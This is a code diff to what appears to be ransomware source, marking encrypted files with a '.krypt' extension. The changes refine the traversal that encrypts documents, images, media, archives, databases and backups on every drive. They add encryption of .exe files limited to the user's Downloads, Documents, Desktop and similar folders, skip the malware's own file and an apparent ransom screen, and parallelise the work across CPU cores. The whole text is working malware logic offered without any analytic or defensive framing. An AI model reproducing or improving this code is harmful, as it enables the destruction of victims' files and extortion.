@@ -152,7 +152,7 @@ def encrypt_file(file_path, key):
             rename_file_with_counter(file_path, '.krypt') # Just rename
         except PermissionError:
             pass
-    except OSError:
+    except:
         pass
 
 # Rename file extension with KRYTPOS tag
@@ -183,16 +183,41 @@ def list_drives():
 
 # Function to handle the traversal of files and encyrption, files searched for contain critical file extensions
 def traverse_encrypt(drive, key):
-    extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv', '.exe')
+    try:
+        username = os.getlogin() # Get username
+    except:
+        username = os.environ.get('USERNAME') # Try username through enviromental variables
     
+    extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', 
+                  '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv')
+    
+    def get_main_dirs(username, drive):
+        # Construct dynamic path
+        main_dirs = [
+            os.path.join(drive, f"Users\\{username}\\Downloads"),
+            os.path.join(drive, f"Users\\{username}\\Documents"),
+            os.path.join(drive, f"Users\\{username}\\Music"),
+            os.path.join(drive, f"Users\\{username}\\Pictures"),
+            os.path.join(drive, f"Users\\{username}\\Desktop"),
+            os.path.join(drive, f"Users\\{username}\\Videos")
+        ]
+        return main_dirs
+        
     for root, _, files in os.walk(drive):
         for file in files:
-            if file == "Screen.exe" or file == os.path.basename(__file__):
-                continue
+            if file.endswith('.exe'):
+                main_dirs = get_main_dirs(username, drive)
+                if any(root.startswith(main_dir) for main_dir in main_dirs):
+                    if file == "Screen.exe" or file == os.path.basename(__file__):
+                        # Skip to prevent self corruption
+                        continue
+                    else:
+                        # Will encyrpt .exe files featured in the general PC files to prevent system corruption
+                        encrypt_file(os.path.join(root, file), key)
             
             if any(file.endswith(ext) for ext in extensions):
                 encrypt_file(os.path.join(root, file), key)
-
+        
 # With threading, attept to traverse and encrypt the found files, use system cores to speed up the process
 def parallel_search(drives, key):
     with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
